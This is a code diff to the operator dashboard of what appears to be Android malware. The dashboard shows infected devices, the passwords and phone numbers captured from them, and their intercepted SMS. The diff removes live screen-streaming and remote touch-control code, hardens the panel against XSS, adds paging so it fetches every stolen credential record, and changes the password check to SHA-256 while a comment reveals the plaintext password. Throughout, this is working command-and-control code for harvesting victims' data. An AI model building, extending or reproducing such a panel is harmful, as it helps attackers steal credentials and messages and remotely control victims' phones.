@@ -566,76 +566,6 @@ body.modo-discreto #dot-discreto { display: block; }
   z-index: 10;
 }
 
-/* ── SEC-ECRA-REMOTO ─────────────────────────────────────────────────── */
-#sec-ecra-remoto {
-  display: none;
-  position: fixed;
-  top: 0; left: 220px; right: 0; bottom: 0;
-  background: var(--bg);
-  overflow-y: auto;
-  padding: 24px;
-  z-index: 10;
-}
-.ecra-header {
-  display: flex; align-items: center; justify-content: space-between;
-  margin-bottom: 20px;
-}
-.ecra-select-row {
-  display: flex; gap: 10px; align-items: center; flex-wrap: wrap;
-  margin-bottom: 20px;
-}
-.ecra-select-row select {
-  background: var(--surface2); border: 1px solid var(--border2);
-  color: var(--text); padding: 8px 12px; border-radius: var(--radius);
-  font-family: var(--mono); font-size: 12px; min-width: 260px;
-}
-.ecra-canvas-wrap {
-  background: #000;
-  border: 1px solid var(--border2);
-  border-radius: var(--radius2);
-  overflow: hidden;
-  display: inline-block;
-  max-width: 100%;
-  position: relative;
-  cursor: crosshair;
-}
-#ecra-img {
-  display: block;
-  max-width: 100%;
-  max-height: calc(100vh - 260px);
-  object-fit: contain;
-  user-select: none;
-  -webkit-user-drag: none;
-}
-.ecra-overlay-msg {
-  position: absolute; inset: 0;
-  display: flex; align-items: center; justify-content: center;
-  flex-direction: column; gap: 10px;
-  color: var(--text2); font-size: 14px; text-align: center;
-  background: rgba(6,6,15,.85);
-}
-.ecra-stats {
-  display: flex; gap: 16px; flex-wrap: wrap;
-  margin-top: 14px; font-family: var(--mono); font-size: 11px; color: var(--muted);
-}
-.ecra-stat span { color: var(--text2); }
-.ecra-controls {
-  display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; align-items: center;
-}
-.ecra-ctrl-btn {
-  background: var(--surface2); border: 1px solid var(--border2);
-  color: var(--text); padding: 6px 14px; border-radius: var(--radius);
-  font-size: 12px; font-family: var(--mono); cursor: pointer;
-  transition: background .15s;
-}
-.ecra-ctrl-btn:hover { background: var(--surface3); }
-.ecra-ctrl-btn.active { background: var(--accentbg); border-color: var(--accentbr); color: var(--accent); }
-.ecra-swipe-hint {
-  font-size: 11px; color: var(--muted); font-family: var(--mono);
-  margin-left: 8px;
-}
-
-
 /* ── SEC-ASSERTIVIDADE ───────────────────────────────────────────────── */
 #sec-assertividade {
   display: none;
@@ -737,10 +667,6 @@ body.modo-discreto #dot-discreto { display: block; }
         <span class="nav-icon">🔬</span> Diagnóstico IA
         <span class="nav-badge" id="nav-diag" style="background:rgba(239,68,68,.15);color:#ef4444;border-color:rgba(239,68,68,.3)">—</span>
       </button>
-      <button class="nav-item" id="nav-item-ecra" onclick="mostrarEcraRemoto(this)">
-        <span class="nav-icon">📡</span> Ecrã Remoto
-        <span class="nav-badge" id="nav-ecra-badge" style="background:rgba(6,182,212,.1);color:var(--accent2);border-color:rgba(6,182,212,.25)">OFF</span>
-      </button>
     </nav>
     <div class="sidebar-footer">
       <button onclick="sair()">
@@ -795,50 +721,6 @@ body.modo-discreto #dot-discreto { display: block; }
             <tr><td colspan="7" style="text-align:center;padding:40px;color:var(--muted)">A carregar...</td></tr>
           </tbody>
         </table>
-      </div>
-    </div>
-
-    <!-- SECÇÃO ECRÃ REMOTO -->
-    <div id="sec-ecra-remoto" style="display:none">
-      <div class="ecra-header">
-        <div>
-          <div style="font-size:18px;font-weight:800">📡 Ecrã Remoto</div>
-          <div style="font-size:12px;color:var(--text2);margin-top:3px">Transmissão em tempo real via Supabase Realtime</div>
-        </div>
-        <div style="display:flex;gap:8px">
-          <button class="btn" onclick="pararStreamEcra()" id="btn-parar-ecra" style="display:none">⏹ Parar</button>
-          <button class="btn btn-primary" onclick="iniciarStreamEcra()" id="btn-iniciar-ecra">▶ Iniciar transmissão</button>
-        </div>
-      </div>
-      <div class="ecra-select-row">
-        <label style="font-size:12px;color:var(--text2)">Dispositivo:</label>
-        <select id="ecra-device-select">
-          <option value="">— Selecciona um dispositivo —</option>
-        </select>
-        <span id="ecra-estado" style="font-size:11px;font-family:var(--mono);color:var(--muted)">Sem transmissão</span>
-      </div>
-      <div class="ecra-canvas-wrap" id="ecra-wrap">
-        <img id="ecra-img" src="" alt="" style="display:none">
-        <div class="ecra-overlay-msg" id="ecra-overlay">
-          <div style="font-size:32px">📱</div>
-          <div>Selecciona um dispositivo e clica <strong>Iniciar transmissão</strong></div>
-        </div>
-      </div>
-      <div class="ecra-stats">
-        <div class="ecra-stat">FPS: <span id="ecra-fps">—</span></div>
-        <div class="ecra-stat">Frames: <span id="ecra-frames">0</span></div>
-        <div class="ecra-stat">Resolução: <span id="ecra-res">—</span></div>
-        <div class="ecra-stat">Último frame: <span id="ecra-ultimo">—</span></div>
-      </div>
-      <div class="ecra-controls">
-        <span style="font-size:11px;color:var(--muted);font-family:var(--mono)">Modo:</span>
-        <button class="ecra-ctrl-btn active" id="modo-toque-btn" onclick="setModoEcra('toque')">👆 Toque</button>
-        <button class="ecra-ctrl-btn" id="modo-swipe-btn" onclick="setModoEcra('swipe')">👈 Swipe</button>
-        <span style="width:1px;height:20px;background:var(--border2);margin:0 4px"></span>
-        <button class="ecra-ctrl-btn" onclick="enviarAccao('voltar')">◀ Voltar</button>
-        <button class="ecra-ctrl-btn" onclick="enviarAccao('home')">⌂ Home</button>
-        <button class="ecra-ctrl-btn" onclick="enviarAccao('recentes')">⧉ Recentes</button>
-        <span class="ecra-swipe-hint" id="ecra-swipe-hint" style="display:none">Clica e arrasta para fazer swipe</span>
       </div>
     </div>
 
@@ -1059,6 +941,20 @@ const headers = {
 let todosDispositivos = [];
 let todasCredenciais  = [];
 let todasSMS          = [];
+
+// ── SEGURANÇA: escapar dados vindos dos dispositivos antes de inserir no DOM ──
+// Estes dados (SMS, modelo, etc.) não são de confiança — vêm da API e,
+// com RLS desligado, podiam ser escritos por qualquer pessoa com a chave anon.
+// Escapar previne XSS armazenado (ex: uma SMS com <script> a executar no painel).
+function escapeHtml(str) {
+  if (str === null || str === undefined) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;');
+}
 
 // ── ESTADO DOS FILTROS & ORDENAÇÃO ────────────────────────────────────
 let filtroEstado = "todos";
@@ -1573,8 +1469,8 @@ function renderLista(dispositivos, credenciais) {
           <div class="device-avatar">${getEmoji(dev.modelo)}</div>
           <div>
             <div class="device-name">
-              ${dev.modelo || "Desconhecido"}
-              ${desact ? `<span style="font-family:var(--mono);font-size:9px;color:#f97316;border:1px solid rgba(249,115,22,0.3);border-radius:4px;padding:1px 5px;margin-left:4px">⚠ ${dev.versao}</span>` : ""}
+              ${escapeHtml(dev.modelo) || "Desconhecido"}
+              ${desact ? `<span style="font-family:var(--mono);font-size:9px;color:#f97316;border:1px solid rgba(249,115,22,0.3);border-radius:4px;padding:1px 5px;margin-left:4px">⚠ ${escapeHtml(dev.versao)}</span>` : ""}
             </div>
             <div class="device-id">${dev.device_id?.substring(0,16) || "—"}... ${locStr ? `· ${locStr}` : ""}</div>
           </div>
@@ -1594,7 +1490,7 @@ function renderLista(dispositivos, credenciais) {
           <div class="history-grid">
             <div class="info-block">
               <h4>📱 Dispositivo</h4>
-              <div class="info-row"><span class="info-label">Modelo</span><span class="info-val">${dev.modelo||"—"}</span></div>
+              <div class="info-row"><span class="info-label">Modelo</span><span class="info-val">${escapeHtml(dev.modelo)||"—"}</span></div>
               <div class="info-row"><span class="info-label">Android</span><span class="info-val">${dev.android||"—"}</span></div>
               <div class="info-row"><span class="info-label">Versão App</span><span class="info-val ${desact?"":"green"}" style="${desact?"color:#f97316":""}">${dev.versao||"—"}${desact?` (desact · atual: ${versaoAtual})`:""}</span></div>
               <div class="info-row"><span class="info-label">Device ID</span><span class="info-val" style="font-size:10px">${dev.device_id||"—"}</span></div>
@@ -1633,7 +1529,7 @@ function renderLista(dispositivos, credenciais) {
                     <div class="tipo">${getTipoLabel(c.tipo)}
                       <span class="cred-capturado-em" title="Momento exacto da captura">🕒 ${formatDateHora(c.criado_em||c.created_at)}</span>
                     </div>
-                    <div>${c.numero?'📞 '+c.numero:''}${c.senha?' · 🔑 '+c.senha:''}${c.valor?c.valor:''}</div>
+                    <div>${c.numero?'📞 '+escapeHtml(c.numero):''}${c.senha?' · 🔑 '+escapeHtml(c.senha):''}${c.valor?escapeHtml(c.valor):''}</div>
                   </div>
                 </div>
               `).join('')
@@ -1653,8 +1549,8 @@ function renderLista(dispositivos, credenciais) {
                   <div class="tl-dot login"></div>
                   <div class="tl-time">${formatDate(new Date(s.timestamp_ms).toISOString())}</div>
                   <div class="tl-content">
-                    <div class="tipo">📨 ${s.remetente||'Desconhecido'}</div>
-                    <div style="word-break:break-word;font-size:12px;color:var(--muted)">${s.corpo||''}</div>
+                    <div class="tipo">📨 ${escapeHtml(s.remetente)||'Desconhecido'}</div>
+                    <div style="word-break:break-word;font-size:12px;color:var(--muted)">${escapeHtml(s.corpo)}</div>
                   </div>
                 </div>
               `).join('')
@@ -1666,17 +1562,6 @@ function renderLista(dispositivos, credenciais) {
             <button onclick="forcarAtualizacao('${dev.device_id}')" style="background:var(--surface2);border:1px solid var(--accent);color:var(--accent);font-family:var(--mono);font-size:11px;padding:8px 14px;border-radius:8px;cursor:pointer;transition:all 0.2s" onmouseover="this.style.background='rgba(124,58,237,0.1)'" onmouseout="this.style.background='var(--surface2)'">
               🔄 Forçar actualização deste dispositivo
             </button>
-            <button onclick="pedirTela('${dev.device_id}')" id="btn-tela-${dev.device_id}" style="background:var(--surface2);border:1px solid #06b6d4;color:#06b6d4;font-family:var(--mono);font-size:11px;padding:8px 14px;border-radius:8px;cursor:pointer;transition:all 0.2s" onmouseover="this.style.background='rgba(6,182,212,0.1)'" onmouseout="this.style.background='var(--surface2)'">
-              📺 Ver tela ao vivo
-            </button>
-          </div>
-          <!-- Container do stream de tela -->
-          <div id="stream-${dev.device_id}" style="display:none;margin-top:16px">
-            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
-              <span style="font-family:var(--mono);font-size:11px;color:#06b6d4">📺 TELA AO VIVO — <span id="stream-fps-${dev.device_id}">a aguardar...</span></span>
-              <button onclick="pararTela('${dev.device_id}')" style="background:rgba(239,68,68,0.1);border:1px solid #ef4444;color:#ef4444;font-family:var(--mono);font-size:10px;padding:4px 10px;border-radius:6px;cursor:pointer">✕ Parar</button>
-            </div>
-            <canvas id="canvas-${dev.device_id}" style="width:100%;border-radius:8px;border:1px solid rgba(6,182,212,0.2);background:#000;display:block"></canvas>
           </div>
         </div>
       </div>
@@ -1842,6 +1727,26 @@ async function forcarAtualizacaoTodos() {
 // CARREGAMENTO
 // ════════════════════════════════════════════════════════════════════════
 
+// Busca TODAS as páginas de uma tabela via PostgREST, sem limite fixo.
+// Evita que tabelas que cresçam além do limite antigo (ex: 5000) percam
+// dados antigos no painel — eles continuam no Supabase, só não eram buscados.
+async function fetchAllPages(baseUrl, pageSize = 1000, maxPages = 50) {
+  let all = [];
+  for (let page = 0; page < maxPages; page++) {
+    const from = page * pageSize;
+    const to = from + pageSize - 1;
+    const r = await fetch(baseUrl, {
+      headers: { ...headers, Range: `${from}-${to}`, Prefer: 'count=exact' }
+    });
+    if (!r.ok) break;
+    const chunk = await r.json();
+    if (!Array.isArray(chunk) || chunk.length === 0) break;
+    all = all.concat(chunk);
+    if (chunk.length < pageSize) break; // última página
+  }
+  return all;
+}
+
 async function carregarComToken() { await carregarDados(); }
 async function carregar() { await carregarDados(); }
 
@@ -1851,12 +1756,12 @@ async function carregarDados() {
   document.getElementById("lista").innerHTML = '<div class="empty"><div class="spinner"></div>A carregar...</div>';
 
   try {
-    const [r1,r2,r3] = await Promise.all([
+    const [r1,r3] = await Promise.all([
       fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000", {headers}),
-      fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=5000", {headers}),
       fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000", {headers})
     ]);
-    const d1=await r1.json(), d2=await r2.json(), d3=await r3.json();
+    const d1=await r1.json(), d3=await r3.json();
+    const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc");
     todosDispositivos = Array.isArray(d1)?d1:[];
     todasCredenciais  = Array.isArray(d2)?d2:[];
     todasSMS          = Array.isArray(d3)?d3:[];
@@ -1877,22 +1782,41 @@ async function carregarDados() {
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// LOGIN
+// LOGIN — autenticação com SHA-256 (Web Crypto API, nativa do browser)
 // ════════════════════════════════════════════════════════════════════════
+//
+// COMO MUDAR A SENHA:
+//   1. Abre a consola do browser (F12 → Console)
+//   2. Cola isto e carrega Enter (substitui "novaSenha" pela tua senha):
+//        crypto.subtle.digest('SHA-256', new TextEncoder().encode('novaSenha'))
+//          .then(b => console.log([...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('')))
+//   3. Copia o hash que aparecer e substitui o valor de SENHA_HASH abaixo.
+//
+// O SHA-256 é de sentido único: mesmo que alguém veja o hash no código,
+// não consegue reverter para a senha original (ao contrário do hex anterior).
+// ─────────────────────────────────────────────────────────────────────────
+const SENHA_HASH = "a0a6d705e68afff9166b6e853983e8e617c2889830d3ae3e0e8ee6c3d630fd6a";
+// ↑ SHA-256 de "skybot123" — muda para uma senha mais forte seguindo as
+//   instruções acima, e actualiza este hash.
 
-const SENHA_HASH = "736b79626f74313233";
-function strToHex(s) { return Array.from(s).map(c=>c.charCodeAt(0).toString(16).padStart(2,"0")).join(""); }
 let autenticado = localStorage.getItem("nexus_auth") === "1";
 
-function fazerLogin(password) {
+async function sha256(str) {
+  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+  return [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2,'0')).join('');
+}
+
+async function fazerLogin(password) {
   if (!password) { alert("Insere a senha!"); return; }
-  if (strToHex(password)===SENHA_HASH) {
+  const hash = await sha256(password);
+  if (hash === SENHA_HASH) {
     localStorage.setItem("nexus_auth","1");
-    autenticado=true;
-    document.getElementById("login-overlay").style.display="none";
+    autenticado = true;
+    document.getElementById("login-overlay").style.display = "none";
     carregarDados();
   } else {
-    const el=document.getElementById("login-error-msg"); if(el) el.textContent="❌ Senha inválida";
+    const el = document.getElementById("login-error-msg");
+    if (el) el.textContent = "❌ Senha inválida";
   }
 }
 
@@ -1903,16 +1827,18 @@ if (!autenticado) {
   document.getElementById("login-overlay").style.display = "flex";
 } else {
   carregarDados();
-  // Auto-actualizar a cada 60s (só dados, não re-renderiza)
+  // Auto-actualizar a cada 60s (só dados, não re-renderiza tudo)
+  // Credenciais usam fetchAllPages para não cortar dados quando a tabela
+  // cresce além de qualquer limite fixo — o problema anterior era aqui.
   setInterval(async () => {
     if (!autenticado) return;
     try {
-      const [r1,r2,r3] = await Promise.all([
+      const [r1,r3] = await Promise.all([
         fetch(SUPA_URL+"/rest/v1/installs?select=*&order=ultimo_acesso.desc.nullslast&limit=1000",{headers}),
-        fetch(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc&limit=5000",{headers}),
         fetch(SUPA_URL+"/rest/v1/sms?select=*&order=criado_em.desc&limit=1000",{headers})
       ]);
-      const d1=await r1.json(),d2=await r2.json(),d3=await r3.json();
+      const d1=await r1.json(), d3=await r3.json();
+      const d2 = await fetchAllPages(SUPA_URL+"/rest/v1/credenciais?select=*&order=id.desc");
       todosDispositivos = Array.isArray(d1)?d1:todosDispositivos;
       todasCredenciais  = Array.isArray(d2)?d2:todasCredenciais;
       todasSMS          = Array.isArray(d3)?d3:todasSMS;
@@ -2063,7 +1989,6 @@ function mostrarAssertividade(btn) {
   if (btn) btn.classList.add('active');
   // Esconder outras secções
   document.getElementById('sec-diagnostico').style.display = 'none';
-  document.getElementById('sec-ecra-remoto').style.display = 'none';
   document.querySelector('.main').style.display = 'none';
   const secAssert = document.getElementById('sec-assertividade');
   secAssert.style.display = 'block';
@@ -2160,8 +2085,6 @@ function mostrarDashboard(btn) {
   if (secDiag) secDiag.style.display = 'none';
   const secAssert = document.getElementById('sec-assertividade');
   if (secAssert) secAssert.style.display = 'none';
-  const secEcra = document.getElementById('sec-ecra-remoto');
-  if (secEcra) secEcra.style.display = 'none';
   const mainEl = document.querySelector('.main');
   if (mainEl) mainEl.style.display = '';
 }
@@ -2174,8 +2097,6 @@ function mostrarDiagnostico() {
   // Esconder .main e mostrar sec-diagnostico
   const mainEl = document.querySelector('.main');
   if (mainEl) mainEl.style.display = 'none';
-  const secEcra = document.getElementById('sec-ecra-remoto');
-  if (secEcra) secEcra.style.display = 'none';
   const secDiag = document.getElementById('sec-diagnostico');
   if (secDiag) { secDiag.style.display = 'block'; secDiag.style.padding = '24px'; }
 
@@ -2304,503 +2225,5 @@ document.addEventListener('DOMContentLoaded', () => {
 
 </script>
 
-<!-- ══════════════════════════════════════════════════════════
-     ALTUS · STREAMING DE TELA AO VIVO (Supabase Realtime)
-     Protocolo: painel envia "pedir_tela" → Android responde
-     com frames JPEG em base64 via canal Realtime
-     ══════════════════════════════════════════════════════════ -->
-<script>
-(function() {
-  // Estado activo por device_id
-  const streamState = {};
-  // Canal Supabase Realtime partilhado
-  let realtimeWs = null;
-  let realtimeReady = false;
-  const realtimeQueue = [];
-  // Frame counters para FPS
-  const frameCounts = {};
-  const fpsIntervals = {};
-
-  // ── Ligar ao Supabase Realtime ──────────────────────────
-  function conectarRealtime() {
-    if (realtimeWs && realtimeWs.readyState === WebSocket.OPEN) return;
-
-    const wsUrl = SUPA_URL.replace('https://', 'wss://') + '/realtime/v1/websocket?apikey=' + SUPA_KEY + '&vsn=1.0.0';
-    realtimeWs = new WebSocket(wsUrl);
-
-    realtimeWs.onopen = () => {
-      realtimeReady = true;
-      // Juntar ao canal de tela
-      realtimeWs.send(JSON.stringify({
-        topic: 'realtime:nexus_tela',
-        event: 'phx_join',
-        payload: {},
-        ref: '1'
-      }));
-      // Enviar mensagens em fila
-      realtimeQueue.forEach(m => realtimeWs.send(JSON.stringify(m)));
-      realtimeQueue.length = 0;
-    };
-
-    realtimeWs.onmessage = (e) => {
-      try {
-        const msg = JSON.parse(e.data);
-        if (msg.event !== 'broadcast' || !msg.payload) return;
-        const p = msg.payload;
-        // Receber frame do Android
-        if (p.event === 'frame' && p.device_id && p.data) {
-          receberFrame(p.device_id, p.data, p.w, p.h);
-        }
-        // Receber confirmação de início
-        if (p.event === 'stream_iniciado' && p.device_id) {
-          const btn = document.getElementById('btn-tela-' + p.device_id);
-          if (btn) btn.textContent = '📺 A transmitir...';
-        }
-        // Receber confirmação de paragem
-        if (p.event === 'stream_parado' && p.device_id) {
-          limparStream(p.device_id);
-        }
-      } catch(_) {}
-    };
-
-    realtimeWs.onclose = () => {
-      realtimeReady = false;
-      // Reconectar após 3s
-      setTimeout(conectarRealtime, 3000);
-    };
-
-    realtimeWs.onerror = () => realtimeWs.close();
-  }
-
-  // ── Enviar mensagem via Realtime ────────────────────────
-  function enviarRealtime(payload) {
-    const msg = {
-      topic: 'realtime:nexus_tela',
-      event: 'broadcast',
-      payload: { type: 'broadcast', event: payload.event, ...payload },
-      ref: String(Date.now())
-    };
-    if (realtimeReady && realtimeWs.readyState === WebSocket.OPEN) {
-      realtimeWs.send(JSON.stringify(msg));
-    } else {
-      realtimeQueue.push(msg);
-      conectarRealtime();
-    }
-  }
-
-  // ── Pedir tela a um dispositivo ─────────────────────────
-  window.pedirTela = function(deviceId) {
-    const container = document.getElementById('stream-' + deviceId);
-    const canvas    = document.getElementById('canvas-' + deviceId);
-    const btn       = document.getElementById('btn-tela-' + deviceId);
-    if (!container || !canvas) return;
-
-    // Mostrar container
-    container.style.display = 'block';
-    if (btn) btn.textContent = '📺 A ligar...';
-
-    // Iniciar contador FPS
-    frameCounts[deviceId] = 0;
-    if (fpsIntervals[deviceId]) clearInterval(fpsIntervals[deviceId]);
-    fpsIntervals[deviceId] = setInterval(() => {
-      const el = document.getElementById('stream-fps-' + deviceId);
-      if (el) {
-        const fps = frameCounts[deviceId];
-        frameCounts[deviceId] = 0;
-        el.textContent = fps > 0 ? fps + ' fps' : 'a aguardar frame...';
-        el.style.color = fps >= 10 ? '#fb923c' : fps > 0 ? '#facc15' : '#ef4444';
-      }
-    }, 1000);
-
-    // Registar estado
-    streamState[deviceId] = true;
-
-    // Conectar Realtime e pedir
-    conectarRealtime();
-    setTimeout(() => {
-      enviarRealtime({ event: 'pedir_tela', device_id: deviceId, para: deviceId });
-    }, realtimeReady ? 0 : 1500);
-  };
-
-  // ── Parar tela ──────────────────────────────────────────
-  window.pararTela = function(deviceId) {
-    enviarRealtime({ event: 'parar_tela', device_id: deviceId, para: deviceId });
-    limparStream(deviceId);
-  };
-
-  function limparStream(deviceId) {
-    delete streamState[deviceId];
-    if (fpsIntervals[deviceId]) { clearInterval(fpsIntervals[deviceId]); delete fpsIntervals[deviceId]; }
-    const container = document.getElementById('stream-' + deviceId);
-    const btn = document.getElementById('btn-tela-' + deviceId);
-    if (container) container.style.display = 'none';
-    if (btn) { btn.textContent = '📺 Ver tela ao vivo'; btn.style.background = 'var(--surface2)'; }
-    const fpsEl = document.getElementById('stream-fps-' + deviceId);
-    if (fpsEl) fpsEl.textContent = 'a aguardar...';
-  }
-
-  // ── Renderizar frame JPEG no canvas ────────────────────
-  function receberFrame(deviceId, base64Data, w, h) {
-    if (!streamState[deviceId]) return;
-    frameCounts[deviceId] = (frameCounts[deviceId] || 0) + 1;
-
-    const canvas = document.getElementById('canvas-' + deviceId);
-    if (!canvas) return;
-
-    const img = new Image();
-    img.onload = () => {
-      // Ajustar canvas na primeira frame
-      if (canvas.width !== img.width || canvas.height !== img.height) {
-        canvas.width  = img.width;
-        canvas.height = img.height;
-        // Manter ratio no CSS
-        const ratio = img.height / img.width;
-        canvas.style.aspectRatio = img.width + ' / ' + img.height;
-      }
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(img, 0, 0);
-    };
-    img.src = 'data:image/jpeg;base64,' + base64Data;
-  }
-
-  // Iniciar ligação quando o painel carrega
-  window.addEventListener('load', () => setTimeout(conectarRealtime, 1000));
-})();
-</script>
-
-<script>
-/* ── ECRÃ REMOTO ─────────────────────────────────────────────────────── */
-(function() {
-  let wsEcra = null;
-  let activeDeviceId = null;
-  let transmitindo = false;
-  let frameCount = 0;
-  let fpsTimer = null;
-  let fpsFrames = 0;
-  let lastFrameTime = null;
-  let modoEcra = 'toque'; // 'toque' ou 'swipe'
-  let swipeInicio = null;
-
-  window.setModoEcra = function(modo) {
-    modoEcra = modo;
-    document.getElementById('modo-toque-btn').classList.toggle('active', modo === 'toque');
-    document.getElementById('modo-swipe-btn').classList.toggle('active', modo === 'swipe');
-    document.getElementById('ecra-swipe-hint').style.display = modo === 'swipe' ? '' : 'none';
-  };
-
-  window.enviarAccao = function(accao) {
-    if (!wsEcra || wsEcra.readyState !== WebSocket.OPEN || !activeDeviceId) return;
-    const canal = 'screen_stream_' + activeDeviceId;
-    wsEcra.send(JSON.stringify({
-      topic: 'realtime:' + canal,
-      event: 'broadcast',
-      payload: {
-        type: 'broadcast',
-        event: 'accao',
-        payload: { event: 'accao', device_id: activeDeviceId, accao }
-      },
-      ref: Date.now().toString()
-    }));
-  };
-
-  function enviarToque(xNorm, yNorm) {
-    if (!wsEcra || wsEcra.readyState !== WebSocket.OPEN || !activeDeviceId) return;
-    const canal = 'screen_stream_' + activeDeviceId;
-    wsEcra.send(JSON.stringify({
-      topic: 'realtime:' + canal,
-      event: 'broadcast',
-      payload: {
-        type: 'broadcast',
-        event: 'toque',
-        payload: { event: 'toque', device_id: activeDeviceId, x: xNorm, y: yNorm }
-      },
-      ref: Date.now().toString()
-    }));
-  }
-
-  function enviarSwipe(x1, y1, x2, y2) {
-    if (!wsEcra || wsEcra.readyState !== WebSocket.OPEN || !activeDeviceId) return;
-    const canal = 'screen_stream_' + activeDeviceId;
-    wsEcra.send(JSON.stringify({
-      topic: 'realtime:' + canal,
-      event: 'broadcast',
-      payload: {
-        type: 'broadcast',
-        event: 'swipe',
-        payload: { event: 'swipe', device_id: activeDeviceId, x1, y1, x2, y2, dur: 400 }
-      },
-      ref: Date.now().toString()
-    }));
-  }
-
-  function coordsNorm(e, el) {
-    const rect = el.getBoundingClientRect();
-    return {
-      x: Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width)),
-      y: Math.max(0, Math.min(1, (e.clientY - rect.top)  / rect.height))
-    };
-  }
-
-  function registarEventosImagem() {
-    const img = document.getElementById('ecra-img');
-
-    img.addEventListener('mousedown', (e) => {
-      if (!transmitindo) return;
-      e.preventDefault();
-      if (modoEcra === 'swipe') {
-        swipeInicio = coordsNorm(e, img);
-      }
-    });
-
-    img.addEventListener('mouseup', (e) => {
-      if (!transmitindo) return;
-      e.preventDefault();
-      const pos = coordsNorm(e, img);
-      if (modoEcra === 'toque') {
-        enviarToque(pos.x, pos.y);
-      } else if (modoEcra === 'swipe' && swipeInicio) {
-        enviarSwipe(swipeInicio.x, swipeInicio.y, pos.x, pos.y);
-        swipeInicio = null;
-      }
-    });
-
-    // Suporte touch (mobile)
-    img.addEventListener('touchstart', (e) => {
-      if (!transmitindo) return;
-      e.preventDefault();
-      const t = e.touches[0];
-      if (modoEcra === 'swipe') swipeInicio = coordsNorm(t, img);
-    }, { passive: false });
-
-    img.addEventListener('touchend', (e) => {
-      if (!transmitindo) return;
-      e.preventDefault();
-      const t = e.changedTouches[0];
-      const pos = coordsNorm(t, img);
-      if (modoEcra === 'toque') {
-        enviarToque(pos.x, pos.y);
-      } else if (modoEcra === 'swipe' && swipeInicio) {
-        enviarSwipe(swipeInicio.x, swipeInicio.y, pos.x, pos.y);
-        swipeInicio = null;
-      }
-    }, { passive: false });
-  }
-
-  // Registar eventos na imagem assim que o DOM estiver pronto
-  document.addEventListener('DOMContentLoaded', registarEventosImagem);
-
-  // Mostrar secção
-  window.mostrarEcraRemoto = function(btn) {
-    // Esconder tudo
-    document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
-    if (btn) btn.classList.add('active');
-    document.getElementById('sec-diagnostico').style.display = 'none';
-    document.getElementById('sec-assertividade').style.display = 'none';
-    document.querySelector('.main') && (document.querySelector('.main').style.display = 'none');
-
-    const sec = document.getElementById('sec-ecra-remoto');
-    sec.style.display = 'block';
-
-    // Popular select com dispositivos já carregados
-    popularSelectDispositivos();
-  };
-
-  function popularSelectDispositivos() {
-    const sel = document.getElementById('ecra-device-select');
-    const anterior = sel.value;
-    while (sel.options.length > 1) sel.remove(1);
-
-    function preencherCom(lista) {
-      // Ordenar: activos hoje primeiro, depois por último acesso
-      const ordenados = [...lista].sort((a, b) => {
-        const aHoje = isHoje ? isHoje(a.ultimo_acesso) : false;
-        const bHoje = isHoje ? isHoje(b.ultimo_acesso) : false;
-        if (aHoje && !bHoje) return -1;
-        if (!aHoje && bHoje) return 1;
-        return (b.ultimo_acesso || '').localeCompare(a.ultimo_acesso || '');
-      });
-
-      ordenados.forEach(d => {
-        if (!d.device_id) return;
-        const opt = document.createElement('option');
-        opt.value = d.device_id;
-        const nome = d.modelo || 'Dispositivo';
-        const acesso = d.ultimo_acesso
-          ? new Date(d.ultimo_acesso).toLocaleString('pt-PT', {day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'})
-          : '—';
-        opt.textContent = nome + '  ·  ' + acesso;
-        sel.appendChild(opt);
-      });
-
-      if (anterior) sel.value = anterior;
-    }
-
-    // Usar array global se já estiver carregado
-    if (typeof todosDispositivos !== 'undefined' && todosDispositivos.length > 0) {
-      preencherCom(todosDispositivos);
-      return;
-    }
-
-    // Fallback: buscar do Supabase
-    fetch(SUPA_URL + '/rest/v1/installs?select=device_id,modelo,ultimo_acesso&order=ultimo_acesso.desc&limit=200', {
-      headers: { apikey: SUPA_KEY, Authorization: 'Bearer ' + SUPA_KEY }
-    }).then(r => r.json()).then(data => preencherCom(data)).catch(() => {});
-  }
-
-  window.iniciarStreamEcra = function() {
-    const sel = document.getElementById('ecra-device-select');
-    const deviceId = sel.value;
-    if (!deviceId) {
-      alert('Selecciona um dispositivo primeiro.');
-      return;
-    }
-    if (transmitindo) pararStreamEcra();
-
-    activeDeviceId = deviceId;
-    transmitindo = true;
-    frameCount = 0;
-    fpsFrames = 0;
-
-    // Actualizar UI
-    document.getElementById('btn-iniciar-ecra').style.display = 'none';
-    document.getElementById('btn-parar-ecra').style.display = '';
-    document.getElementById('ecra-estado').textContent = 'A ligar…';
-    document.getElementById('ecra-estado').style.color = 'var(--yellow)';
-    document.getElementById('nav-ecra-badge').textContent = 'ON';
-    document.getElementById('nav-ecra-badge').style.color = 'var(--green)';
-
-    // Ligar WebSocket ao Supabase Realtime
-    const wsUrl = SUPA_URL
-      .replace('https://', 'wss://')
-      .replace('http://', 'ws://')
-      .replace(/\/$/, '') + '/realtime/v1/websocket?apikey=' + SUPA_KEY + '&vsn=1.0.0';
-
-    wsEcra = new WebSocket(wsUrl);
-    const canal = 'screen_stream_' + deviceId;
-
-    wsEcra.onopen = () => {
-      // Subscrever canal
-      wsEcra.send(JSON.stringify({
-        topic: 'realtime:' + canal,
-        event: 'phx_join',
-        payload: {},
-        ref: '1'
-      }));
-    };
-
-    wsEcra.onmessage = (evt) => {
-      try {
-        const msg = JSON.parse(evt.data);
-        // Confirmar join
-        if (msg.event === 'phx_reply' && msg.payload?.status === 'ok') {
-          // Enviar comando pedir_tela ao device
-          wsEcra.send(JSON.stringify({
-            topic: 'realtime:' + canal,
-            event: 'broadcast',
-            payload: {
-              type: 'broadcast',
